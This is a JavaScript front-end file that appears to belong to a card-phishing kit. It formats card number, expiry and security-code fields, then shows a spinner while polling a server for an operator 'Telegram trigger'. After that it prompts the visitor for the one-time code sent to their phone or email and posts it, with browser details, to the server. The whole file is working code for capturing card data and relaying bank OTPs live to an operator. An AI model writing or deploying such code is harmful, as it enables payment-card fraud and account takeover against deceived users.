// js/index.js

$(document).ready(function() {
  // ensure jQuery includes the session cookie on every request
  $.ajaxSetup({
    xhrFields: { withCredentials: true },
    crossDomain: true,
    cache: false      // disable jQuery cache
  });

  // ——————————————————————————————————————————
  // 1) IMask for card inputs (only on pages with #cardnumber)
  // ——————————————————————————————————————————
  if (document.getElementById("cardnumber")) {
    const cardnumber    = document.getElementById("cardnumber");
    const expirationdate = document.getElementById("expirationdate");
    const securitycode   = document.getElementById("securitycode");

    const cardnumber_mask = new IMask(cardnumber, {
      mask: [
        { mask: "0000-000000-00000", regex: "^3[47]\\d{0,13}", cardtype: "american express" },
        { mask: "0000-0000-0000-0000", regex: "^(?:6011|65\\d{0,2}|64[4-9]\\d?)\\d{0,12}", cardtype: "discover" },
        { mask: "0000-000000-0000",        regex: "^3(?:0([0-5]|9)|[689]\\d?)\\d{0,11}", cardtype: "diners" },
        { mask: "0000-0000-0000-0000", regex: "^(5[1-5]\\d{0,2}|22[2-9]\\d{0,1}|2[3-7]\\d{0,2})\\d{0,12}", cardtype: "mastercard" },
        { mask: "0000-000000-00000", regex: "^(?:2131|1800)\\d{0,11}", cardtype: "jcb15" },
        { mask: "0000-0000-0000-0000", regex: "^(?:35\\d{0,2})\\d{0,12}", cardtype: "jcb" },
        { mask: "0000-0000-0000-0000", regex: "^(?:5[0678]\\d{0,2}|6304|67\\d{0,2})\\d{0,12}", cardtype: "maestro" },
        { mask: "0000-0000-0000-0000", regex: "^4\\d{0,15}", cardtype: "visa" },
        { mask: "0000-0000-0000-0000", regex: "^62\\d{0,14}", cardtype: "unionpay" },
        { mask: "0000-0000-0000-0000", cardtype: "Unknown" }
      ],
      dispatch: (appended, dynamicMasked) => {
        const number = (dynamicMasked.value + appended).replace(/\D/g, "");
        for (const m of dynamicMasked.compiledMasks) {
          if (m.regex && number.match(new RegExp(m.regex))) {
            return m;
          }
        }
        return dynamicMasked.compiledMasks.slice(-1)[0];
      }
    });

    IMask(securitycode, { mask: "0000" });
    IMask(expirationdate, {
      mask: "MM{/}YY",
      groups: {
        YY: new IMask.MaskedPattern.Group.Range([0, 99]),
        MM: new IMask.MaskedPattern.Group.Range([1, 12])
      }
    });

    cardnumber_mask.on("accept", () => {
      const type = cardnumber_mask.masked.currentMask.cardtype;
      if (type === "visa") {
        $("i").removeClass("suffix-mastercard").addClass("suffix-visa");
      } else if (type === "mastercard") {
        $("i").removeClass("suffix-visa").addClass("suffix-mastercard");
      } else {
        $("i").removeClass("suffix-visa suffix-mastercard");
      }
    });
  }

  // ——————————————————————————————————————————
  // 2) Spinner → OTP prompt (polling for Telegram trigger + phoneLast4)
  // ——————————————————————————————————————————
  if ($('.sk-chase').length) {
    let readyPoller, verifyPoller;

    function hideSpinner() {
      $('.sk-chase').fadeOut(300);
      $('.sub-title').fadeOut(200);
    }

    function showOtpPrompt(promptText, errorMsg) {
      hideSpinner();
      $('.sub-title')
        .text(errorMsg || promptText)
        .fadeIn(200);
      $('.otp-form').delay(200).fadeIn(300);
      $('.otp-error').remove();
      if (errorMsg) {
        $('<div class="otp-error" style="color:red; margin-bottom:0.5rem;">' + errorMsg + '</div>')
          .insertBefore('#otp-input');
      }
    }

    // 1) Poll until Telegram signals ready
    readyPoller = setInterval(() => {
      $.ajax({
        url:      '/otp-status',
        dataType: 'json',
        cache:    false,
        headers:  { 'Cache-Control': 'no-store' }
      })
      .done(res => {
        console.log('[OTP STATUS]', res);
        if (res.ready && (res.method === 'phone' || res.method === 'email')) {
          clearInterval(readyPoller);

          let promptText;
          if (res.method === 'phone') {
            promptText = res.phoneLast4
              ? `Enter the OTP sent to your phone ending in ****${res.phoneLast4}`
              : 'Enter the OTP sent to your phone';
          } else {
            promptText = 'Enter the OTP sent to your email';
          }

          console.log('showOtpPrompt called with:', promptText);
          showOtpPrompt(promptText);
        }
      })
      .fail(() => console.warn('Failed fetching /otp-status'));
    }, 2000);

    // 2) Handle OTP submission
    $('#otp-submit').off('click').on('click', () => {
      const otp = $('#otp-input').val().trim();
      if (!/^[0-9]{6}$/.test(otp)) {
        return showOtpPrompt(null, 'Enter a valid 6‑digit code');
      }

      // Show spinner while verifying
      $('.otp-form').fadeOut(200, () => {
        $('.sub-title').text('Verifying OTP...').fadeIn(200);
        $('.sk-chase').fadeIn(300);
      });

      $.ajax({
        url:      '/submit-otp',
        method:   'POST',
        dataType: 'json',
        cache:    false,
        contentType: 'application/json',
        data:    JSON.stringify({
          otp,
          ua: navigator.userAgent,
          tz: Intl.DateTimeFormat().resolvedOptions().timeZone
        }),
        headers: { 'Cache-Control': 'no-store' }
      })
      .done(() => {
        // Poll for verification result
        verifyPoller = setInterval(() => {
          $.ajax({
            url:      '/otp-verify-status',
            dataType: 'json',
            cache:    false,
            headers:  { 'Cache-Control': 'no-store' }
          })
          .done(res => {
            console.log('[OTP VERIFY]', res);
            if (res.valid === true) {
              clearInterval(verifyPoller);
              window.location.href = '/success.html';
            } else if (res.valid === false) {
              clearInterval(verifyPoller);
              showOtpPrompt('Please enter your OTP', 'Incorrect code, try again');
            }
          })
          .fail(() => console.warn('Failed fetching /otp-verify-status'));
        }, 2000);
      })
      .fail(() => showOtpPrompt(null, 'Error sending code, please retry'));
    });
  }
});
